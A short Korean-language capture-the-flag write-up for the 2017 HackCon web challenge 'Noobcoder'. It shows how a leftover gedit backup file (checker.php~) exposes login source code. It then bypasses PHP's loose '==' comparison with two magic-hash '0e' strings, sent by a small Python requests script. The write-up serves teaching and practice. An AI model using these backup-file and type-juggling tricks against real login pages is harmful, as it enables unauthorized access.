==============================================================
[2017_HackCon] [WEB] Noobcoder
==============================================================


문제내용
==============================================================


A junior recently started doing PHP, and makes some random shit. He uses gedit as his go-to editor with a black theme thinking it was sublime.
So he made this login portal, I am sure he must have left something out. Why don't you give it a try?
Server: http://defcon.org.in:6062

Note: dirbuster is NOT required for this question



문제 풀이
==============================================================

gedit 에디터를 사용한다고 한다. 로그인을 확인하는 checker.php를 checker.php~로 다운로드를 한다.
해당 파일에 소스를 확인해보자.

.. code-block:: php

    <html>
    <head>
    </head>
    <body>
    <?php
    if ($_POST["username"] == $_POST["password"] && $_POST["password"] !== $_POST["username"])
        echo "congratulations the flag is d4rk{TODO}c0de";
    else
        echo "nice try, but try again";
    ?>
    </body>
    </html>


소스상에서 username 데이터와 password 데이터가 같지만 같지 않을 경우 플래그를 출력한다.
php는 "=="을 사용할 경우 비교 연산자 취약점이 존재할 수 있다. 다음 코드를 실행할 경우 플래그를 획득할 수 있다.

.. code-block:: python

    import requests

    url = "http://defcon.org.in:6062/checker.php"
    data = {
        "username":"0e1208123",
        "password":"0e0956871"

    }
    r = requests.post(url, data=data)
    print r.content


